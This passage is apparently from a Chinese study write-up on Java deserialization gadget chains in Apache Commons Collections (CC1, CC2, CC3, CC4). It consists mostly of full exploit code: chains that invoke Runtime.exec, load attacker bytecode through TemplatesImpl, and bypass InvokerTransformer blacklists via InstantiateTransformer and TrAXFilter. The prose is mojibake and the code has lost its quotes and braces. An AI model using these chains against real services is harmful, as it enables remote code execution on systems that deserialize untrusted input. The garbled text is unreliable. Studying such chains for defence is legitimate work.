HashMap(); map2.put(tiedMapEntry, bbb); serialize(map2); ç¡®å®å‡ºç°äº†è®¡ç®—å™¨å¼¹çª—ï¼Œä½†æ˜¯ä¸éœ€è¦ååºåˆ—åŒ–ä¹Ÿå¯ä»¥ï¼Œè¿™ä¸ç¦è®©äººæƒ³åˆ°äº†ä¹‹å‰URLDNSé“¾çš„é‚£ä¸€ä¸ªç±»ä¼¼çš„ç‚¹ï¼Œå› ä¸ºput()æ–¹æ³•ä¸­ä¹Ÿä¼šè°ƒç”¨hash()æ–¹æ³• é‚£å°±é‡‡å–å’Œå½“æ—¶ç±»ä¼¼çš„åšæ³•å‘—ï¼Œæ—¢ç„¶putä¼šè°ƒç”¨hashé‚£å°±å…ˆåœ¨è¿™ä¹‹å‰é€šè¿‡åå°„ä¿®æ”¹æŸäº›å±æ€§ä½¿å¾—è¿™æ¡é“¾æ— æ³•èµ°ä¸‹å» è¿™é‡Œç›´æ¥é€‰æ‹©æŠŠlazyMapçš„chainedTransformeræ”¹æˆéšä¾¿ä¸€ä¸ªTransformå¯¹è±¡ï¼Œputä¹‹åå†é€šè¿‡åå°„å°†lazyMap.factoryçš„å€¼æ”¹ä¸ºchainedTransformer MapObject, Object lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, aaa);HashMapObject, Object map2 = new HashMap();map2.put(tiedMapEntry, bbb);Class c = LazyMap.class;Field factoryField = c.getDeclaredField(factory);factoryField.setAccessible(true);factoryField.set(lazyMap, chainedTransformer); ä½†æ˜¯è¿™æ ·å­ä¿®æ”¹å®Œäº†ä¹‹åæ— è®ºæ˜¯åºåˆ—åŒ–è¿˜æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™éƒ½æ— æ³•æ‰§è¡Œå¼¹çª—ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ é—®é¢˜å‡ºåœ¨äº†LazyMapçš„get()æ–¹æ³•ä¸Šï¼ŒLazyMapï¼Œå­—é¢æ„æ€å¾ˆå¥½ç†è§£ä¹Ÿå°±æ˜¯æ‡’åŠ è½½ï¼Œå½“åˆ¤æ–­mapä¸­è·å–ä¸åˆ°keyï¼Œä¹Ÿå°±æ˜¯getä¸åˆ°æ—¶ï¼Œå°±å»è°ƒç”¨factoryçš„transformæ–¹æ³•æ¥å‘mapä¸­æ·»åŠ ä¸€ç»„é”®å€¼å¯¹å¹¶è¿”å›è°ƒç”¨transform()æ–¹æ³•åçš„ç»“æœã€‚ä¸€å¼€å§‹åœ¨è°ƒç”¨put()æ–¹æ³•æ—¶é¿å…ä¸äº†è°ƒç”¨hashCode()ï¼Œä¹Ÿå°±æ— æ³•é¿å…ä½¿ç”¨getValue()-get()æ–¹æ³•ï¼Œå› æ­¤é”®åä¸ºaaaçš„é”®åœ¨putæ—¶å°±ä¼šæ’å…¥åˆ°lazyMap.mapä¸­ï¼Œå½“å‘mapä¸­æ’å…¥è¿™ä¸ªé”®å€¼å¯¹ä¹‹åï¼Œä¹Ÿå°±æ˜¯è¯´lazyMapçš„mapä¸­æ­¤æ—¶å·²ç»å­˜åœ¨äº†aaaè¿™ä¸ªé”®äº†ï¼Œè¿™æ—¶å€™è¿›è¡Œååºåˆ—åŒ–æ˜¯æ— æ³•æ»¡è¶³è¿™ä¸ªifçš„åˆ¤æ–­çš„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨è°ƒç”¨putæ–¹æ³•è¿‡ååˆ é™¤æ‰aaaè¿™ä¸ªé”®å³å¯ å®Œæ•´ä»£ç å¦‚ä¸‹ package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class Main public static void main(String[] args) throws Exception Transformer[] transformers = new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec, new Class[]String.class, new Object[]calc) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMapObject, Object map = new HashMap(); MapObject, Object lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, aaa); HashMapObject, Object map2 = new HashMap(); map2.put(tiedMapEntry, bbb); lazyMap.remove(aaa); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(factory); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer);// serialize(map2); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; CC3newTransformer()æ–¹æ³•è¿™é‡Œé€šè¿‡CLassLoaderç±»ä¸­çš„defineClassæ–¹æ³•è¿›è¡Œç±»åŠ è½½ï¼Œä½†è¯¥æ–¹æ³•æ˜¯ä¸€ä¸ªå—ä¿æŠ¤çš„æ–¹æ³•ï¼Œä¸èƒ½å¤Ÿç›´æ¥è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯»æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰é‡å†™è¯¥æ–¹æ³•çš„åœ°æ–¹ CLassLoaderç±»ä¸­æœ‰å¤šä¸ªé‡å†™çš„defineClassæ–¹æ³•ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªæŸ¥æ‰¾ç”¨æ³•çœ‹æœ‰æ²¡æœ‰publicçš„åœ°æ–¹ï¼Œæœ€ç»ˆæ‰¾åˆ°å¦‚ä¸‹ï¼š å‘ç°è¯¥æ–¹æ³•æ˜¯é»˜è®¤çš„ï¼Œè¯´æ˜åªæœ‰åœ¨è¯¥æ–‡ä»¶ä¸­å¯ä»¥è°ƒç”¨è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬æŸ¥æ‰¾ä¸€ä¸‹æ˜¯åœ¨defineTransletClassesæ–¹æ³•ä¸­è°ƒç”¨äº†ï¼Œå¯æƒœæ˜¯ç§æœ‰çš„ åœ¨defineTransletClasses()æ–¹æ³•ä¸‹æ‰¾åˆ°äº†å¯¹å…¶çš„è°ƒç”¨ï¼Œå¹¶ä¸”ç»“æœè¢«_classæ•°ç»„ç»™è·å–åˆ°äº†ï¼Œè·Ÿè¸ªåˆ°è¿™é‡Œå…¶å®å¿ƒé‡Œå·²ç»è§‰å¾—å¾ˆå¤§æ¦‚ç‡å°±æ˜¯èµ°çš„è¿™ä¸ªåˆ©ç”¨é“¾äº†ï¼Œè‡³å°‘ç›®å‰ä¸ºæ­¢æ²¡é”™ã€‚æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾_classæ•°ç»„å†…å…ƒç´ çš„å®ä¾‹åŒ–ï¼Œæ—¢ç„¶æœ‰ç±»åŠ è½½æ–¹æ³•ï¼Œå¤§æ¦‚ç‡è¿™ä¸ªç±»ä¹Ÿæ˜¯æœ‰ç±»å®ä¾‹åŒ–çš„æ–¹æ³•çš„ é‚£æˆ‘ä»¬ç»§ç»­æŸ¥æ‰¾è¯¥æ–¹æ³•çš„ç”¨é€”ï¼Œåœ¨getTransletInstance()æ–¹æ³•ä¸­å¯¹_classå…ƒç´ çš„å®ä¾‹åŒ–ï¼Œä¸‹æ ‡_transletIndexå¯æ§ ä½†æ˜¯æ­¤å¤„çš„getTransletInstance()æ–¹æ³•ä»ç„¶æ˜¯ç§æœ‰çš„æ–¹æ³•ï¼Œå› æ­¤è¿˜å¾—ç»§ç»­æŸ¥æ‰¾æ–¹æ³•è°ƒç”¨ç›´è‡³åˆ°publicï¼šnewTransformerè¿™ä¸ªpublicæ–¹æ³• åˆ°ç°åœ¨æˆ‘ä»¬å°±æ‰¾åˆ°äº†ä¸€æ¡å¾ˆå¥½çš„åˆ©ç”¨é“¾äº† æ–°å»ºå¯¹è±¡çš„æ—¶å€™ä¼šè°ƒç”¨getTransletInstance()æ–¹æ³•ï¼Œè€ŒgetTransletInstance()ä¸­å¦‚æœ_classè¿˜æ˜¯nullçš„è¯å°±ä¼šè°ƒç”¨defineTransletClasses()æ–¹æ³•è¿›è¡Œç±»åŠ è½½åå†åœ¨getTransletInstance()ä¸­è¿›è¡Œå®ä¾‹åŒ– TemplatesImpl templates = new TemplatesImpl();templates.newTransformer(); çœ‹ç€æ˜¯å¾ˆç®€å•ï¼Œä½†è¿™è¾¹æˆ‘ä»¬è°ƒç”¨çš„æ˜¯æ— å‚æ„é€ å‡½æ•°ï¼Œè¿˜ä¸å®šèƒ½å¤Ÿæ‰§è¡Œåˆ°defineClassæ–¹æ³•ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€çœ‹ é¦–å…ˆå°±æ˜¯_nameå‚æ•°ä¸èƒ½å¤Ÿä¸ºç©ºï¼Œè€Œ_classå‚æ•°å¿…é¡»ä¸ºç©ºï¼Œç»§ç»­è·Ÿè¿›defineTransletClasses()æ–¹æ³• æˆ‘ä»¬å¯ä»¥çŸ¥é“_bytecodeså‚æ•°ä¸èƒ½ä¸ºç©ºï¼Œå¦åˆ™ä¼šæŠ›å¼‚å¸¸ï¼›_tfactoryå‚æ•°ä¼šè°ƒç”¨ä¸€ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥å®ƒä¹Ÿå¿…é¡»è¢«èµ‹å€¼ ç›®å‰è¾ƒä¸ºæ˜æ˜¾çš„å°±è¿™ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡åå°„å¯¹ä»–ä»¬è¿›è¡Œèµ‹å€¼ ç‰¹åˆ«è¦æ³¨æ„çš„æ˜¯_bytecodeså‚æ•°ï¼Œè¿™æ˜¯å› ä¸ºdefineClassçš„å‚æ•°å°±æ˜¯å®ƒï¼Œä¸ç±»åŠ è½½æœ‰å…³ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¯¥å‚æ•°ï¼Œå¯ä»¥å‘ç°æ˜¯äºŒç»´æ•°ç»„ é‚£è¦æ€ä¹ˆç»™å®ƒèµ‹å€¼å‘¢ï¼Œè¿™æˆ‘ä»¬å°±éœ€è¦çœ‹ä¸‹è¯¥å¤„é‡å†™çš„defineClassæ–¹æ³•çš„é€»è¾‘äº† å¯ä»¥å‘ç°å®ƒéœ€è¦çš„æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ˜¯è¦åœ¨_bytecodesä¸­çš„æˆå‘˜éœ€è¦æ—¶ä¸€ç»´æ•°ç»„ï¼Œå†…å®¹æ˜¯å­—èŠ‚ç  æˆ‘ä»¬å†çœ‹ä¸€ä¸‹_tfactoryå‚æ•°ï¼Œå‰é¢çš„transientä»£è¡¨çš„æ˜¯ä¸å¯åºåˆ—åŒ– è¿™è¯´æ˜å³ä½¿æˆ‘ä»¬ç°åœ¨ç»™å®ƒè¿›è¡Œèµ‹å€¼ï¼Œåˆ°ååºåˆ—åŒ–åä¹Ÿè¿˜æ˜¯ä¼šç­‰äºnullï¼Œä½†æˆ‘ä»¬æœ‰éœ€è¦è¿™ä¸ªå€¼ï¼Œé‚£è¯´æ˜äº†readObjectä¸­è‚¯å®šæœ‰ä¸œè¥¿ï¼Œåœ¨readObjectä¸­å·²ç»ç»™å®ƒèµ‹å€¼å®Œäº† æ‰€ä»¥æˆ‘ä»¬æœ€åˆçš„æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼Œä½†æ˜¯è¿è¡Œä¹‹åä¼šæŠ¥ç©ºæŒ‡é’ˆé”™è¯¯ï¼Œä½äºdefineTransletClasses()æ–¹æ³• æˆ‘ä»¬è°ƒè¯•çœ‹ä¸€ä¸‹ï¼Œæ–­ç‚¹è®¾åœ¨å¦‚ä¸‹æ‰€ç¤ºçš„ä½ç½®ï¼š è°ƒè¯•ä¸‹æ¥å‘ç°ç©ºæŒ‡é’ˆå‡ºé”™åœ¨_auxClassesä¸ºç©º æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼Œä¸€ç§æ˜¯èµ°è¿›ifä»å¥ä¸­ï¼Œå¦ä¸€ç§æ˜¯ç»™_auxClassesèµ‹å€¼ ç”¨ç¬¬äºŒç§æ–¹æ³•çš„è¯_transletIndexå€¼é»˜è®¤ç­‰äº-1ï¼Œè¿è¡Œä¸‹å»çš„è¯è¿˜æ˜¯ä¼šæŠ¥å¦ä¸€ç§é”™è¯¯ æ‰€ä»¥ç¬¬äºŒç§æ–¹æ¡ˆä¸å¯è¡Œï¼Œifä»å¥çš„æ„æ€æ˜¯_classçš„çˆ¶ç±»å¿…é¡»æ˜¯ABSTRACT_TRANSLETï¼Œå¦‚ä¸‹ æ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©Testç±»ç»§æ‰¿è¯¥æŠ½è±¡ç±»ï¼Œå¹¶å®ç°æŠ½è±¡æ–¹æ³• package org.example;import java.io.IOException;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException static try Runtime.getRuntime().exec(calc); catch (IOException e) throw new RuntimeException(e); ç°åœ¨æˆ‘ä»¬å†è¿”å›å»æ‰§è¡Œæµ‹è¯•ä»£ç ï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Cc3 public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); templates.newTransformer(); ä¸Šè¿°ä»£ç è¯´æ˜äº†åªè¦æˆ‘ä»¬æ‰§è¡Œäº†newTransformer()æ–¹æ³•ï¼Œå°±ç›¸å½“äºå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº† é‚£ä¹ˆæˆ‘ä»¬åªè¦æŠŠè¿™ä¸ªæ‰”è¿›ChainedTransformerä¸­å°±å¯ä»¥äº†ï¼Œç„¶åæˆ‘ä»¬ç›´æ¥æŠŠcc1çš„ååŠæ®µç›´æ¥ç²˜è¿‡æ¥å°±å¯ä»¥äº† package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Cc3 public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer(); Transformer[] transformers = new Transformer[] new ConstantTransformer(templates), new InvokerTransformer(newTransformer, null, null) ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);// chainedTransformer.transform(1); æµ‹è¯•chainedTransformerå¯ä¸å¯ä»¥è¿è¡Œ HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Target.class, transformedMap);// serialize(o); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; äºæ˜¯ä¹æˆ‘ä»¬åˆæœ‰äº†ä¸€æ¡æ–°çš„é“¾ InstantiateTransformerç±»ä½†æ˜¯è¦æ˜¯é»‘åå•æŠŠInvokerTransformç±»ç»™ç¦æ‰äº†çš„è¯ï¼Œæˆ‘ä»¬è¿˜èƒ½æœ‰ä»€ä¹ˆåŠæ³•å¯ä»¥ç»•è¿‡ æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹newTransformer()æ–¹æ³•æœ‰å“ªäº›åœ°æ–¹ä¼šè°ƒç”¨åˆ°ï¼Œä¸‹é¢æœ‰ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ TrAXFilterç±»ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³åºåˆ—åŒ–å®ƒçš„è¯åªèƒ½ä»å®ƒçš„Classå…¥æ‰‹ï¼Œå°±è·ŸRuntimeä¸€æ ·ï¼Œè¿™æ ·å­çš„è¯æˆ‘ä»¬è¦æ€ä¹ˆèµ‹å€¼å‘¢ï¼Œé‚£å°±æ˜¯åœ¨æ„é€ å‡½æ•°é‡Œé¢ï¼Œè€Œæˆ‘ä»¬æ‰€éœ€è¦çš„æ–¹æ³•ä¹Ÿå‡ºç°åœ¨æ„é€ å‡½æ•°ä¸­ è¿™æ¬¡æˆ‘ä»¬ä¸ç”¨InvokerTransformç±»ï¼Œæ”¹ç”¨InstantiateTransformerç±»ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å®ƒçš„transformæ–¹æ³• ç®€å•æ¥è¯´å°±æ˜¯çœ‹è¾“å…¥æ˜¯ä¸æ˜¯ä¸€ä¸ªç±»ï¼Œå¦‚æœæ˜¯çš„è¯å°±ä¼šè°ƒç”¨å®ƒçš„æ„é€ å™¨æ¥è¿›è¡Œåˆå§‹åŒ– InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]Templates.class,new Object[]templates);instantiateTransformer.transform(TrAXFilter.class); //å®ƒçš„classç±»å‹å¯ä»¥åºåˆ—åŒ–ï¼Œè¯¥è¡Œä»£ç è¿è¡Œå¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ æ¥ä¸‹æ¥ç”¨ä¸Šcc1çš„å‰åŠæ¡é“¾ï¼Œé™„ä¸Šå®Œæ•´ä»£ç  package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.Templates;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Cc3 public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]Templates.class,new Object[]templates); Transformer[] transformers = new Transformer[] new ConstantTransformer(TrAXFilter.class), instantiateTransformer ; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);// instantiateTransformer.transform(TrAXFilter.class); //å®ƒçš„classç±»å‹å¯ä»¥åºåˆ—åŒ–ï¼Œè¯¥è¡Œä»£ç è¿è¡Œå¯ä»¥å¼¹å‡ºè®¡ç®—å™¨ HashMapObject, Object map = new HashMap(); map.put(value, b); MapObject, Object transformedMap = TransformedMap.decorate(map, null, chainedTransformer); Class c = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor ctor = c.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object o = ctor.newInstance(Target.class, transformedMap);// serialize(o); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; è¿™æ ·å­æˆ‘ä»¬å°±åˆæœ‰ä¸€æ¡æ–°é“¾ CC4ä¾èµ–å¼•å…¥ dependency groupIdorg.apache.commons/groupId artifactIdcommons-collections4/artifactId version4.0/version/dependency ä¸‹é¢çš„æ–¹æ³•ç­‰å…¨éƒ¨éƒ½æ˜¯ç”¨collections4ä¸­çš„ï¼Œä¸å†æ˜¯3.2.1ä¸­çš„ CC4.0ä»å¯åˆ©ç”¨3çš„CommonsCollections4.0ä¸­ä»ç„¶å­˜åœ¨3.2.1çš„ååºåˆ—åŒ–é“¾ï¼ŒæŠŠLazyMap.decorate()æ”¹æˆLazyMap.lazyMap()å°±è¡Œäº† package com.potato.Commons_Collections;import com.potato.Tools.Utils;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.HashMap;public class CC4 public static void main(String[] args) throws Exception// Class.class.getMethod().invoke(); ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,new Class[]), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec,new Class[]String.class,new Object[]calc) );// chainedTransformer.transform(11); HashMapObject,Object hashMap = new HashMap();// hashMap.put(11,111); Class? c = org.apache.commons.collections4.map.LazyMap.class; LazyMap lazyMap = org.apache.commons.collections4.map.LazyMap.lazyMap(hashMap,new ConstantTransformer(11));// LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap,new ConstantTransformer(11)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,1);// TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,1); HashMapObject,Object hashMap1 = new HashMap(); hashMap1.put(tiedMapEntry,1); Field factoryField = c.getDeclaredField(factory); factoryField.setAccessible(true); factoryField.set(lazyMap,chainedTransformer); lazyMap.remove(1);// Class? Utils.serialize(hashMap1); Utils.unserialize(obj.ser); åˆ©ç”¨ä¼˜å…ˆé˜Ÿåˆ—æˆ‘ä»¬æŸ¥çœ‹ChainedTransformerç±»ä¸­transformæ–¹æ³•çš„ç”¨æ³•ï¼Œæ‰¾ä¸€ä¸ªæ–°çš„ï¼Œä½äºorgapachecommonscollections4comparatorsTransformingComparator.javaä¸­çš„compare()æ–¹æ³• é€‰è¿™ä¸ªçš„ç†ç”±åœ¨äºè¯¥ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„ æˆ‘ä»¬ç»§ç»­æŸ¥æ‰¾compareæ–¹æ³•çš„ç”¨é€”ï¼Œä¹Ÿæ˜¯è¦åœ¨readObjectä¸­è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œæ¯”è¾ƒéš¾æ‰¾ï¼Œå³åœ¨ä¼˜å…ˆé˜Ÿåˆ—ï¼ˆPriorityQueueï¼‰ä¸­ åœ¨è¯¥ç±»çš„readObjectä¸­è°ƒç”¨äº†ä¸€ä¸ªheapifyæ–¹æ³• æˆ‘ä»¬è·Ÿè¿›å»ï¼Œå¯¹è¯¥å‡½æ•°è°ƒç”¨çš„æ–¹æ³•ç»§ç»­è·Ÿè¸ªï¼Œç›´åˆ°ä¸‹é¢è¿™ä¸ªå‡½æ•°ä¸ºæ­¢ è°ƒç”¨äº†compareæ–¹æ³•ï¼Œä¹Ÿå°±ä¼šè°ƒç”¨ä¸Štransformæ–¹æ³• è¿™æ ·å­çš„è¯æˆ‘ä»¬å°±æœ‰äº†ä¸€æ¡æ–°çš„é“¾ å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Cc4 public static void main(String[] args) throws Exception ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,new Class[]), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec,new Class[]String.class,new Object[]calc) );// chainedTransformer.transform(11); //é¿å…åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±è°ˆè®¡ç®—å™¨ TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); //é˜Ÿåˆ—ä¸­éœ€è¦æœ‰ä¸¤ä¸ªå€¼æ‰å¯ä»¥æ‰§è¡Œåˆ°readObjectä¸­heapify()æ–¹æ³•ä¸­çš„forå¾ªç¯åŒºåŸŸå†… priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(transformer); transformerField.setAccessible(true); transformerField.set(transformingComparator, chainedTransformer);// serialize(priorityQueue); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; å…¶ä¸­chainedTransformerä¸­çš„å†…å®¹ä¹Ÿå¯ä»¥æ¢æˆCC3ä¸­çš„InstantiateTransformerç±»ï¼Œç»•è¿‡InvokerTransformerç±»è¢«ç¦çš„æƒ…å†µ CC2å…¶å®å°±æ˜¯CC4å’ŒnewTransformer()æ–¹æ³•çš„æ‹¼æ¥ TransformingComparatorç±»åœ¨cc4ä¸­å®ç°äº†åºåˆ—åŒ–æ¥å£ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Cc2 public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); InvokerTransformerObject, Object invokerTransformer = new InvokerTransformer(newTransformer, new Class[], new Object[]); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); //addçš„å†…å®¹ä¸ºå¯¹è±¡templates,æ˜¯ä¸ºäº†æ»¡è¶³compareæ–¹æ³•ä¸­this.transformer(invokerTransformer)çš„transformæ–¹æ³•çš„å‚æ•° priorityQueue.add(templates); priorityQueue.add(templates); 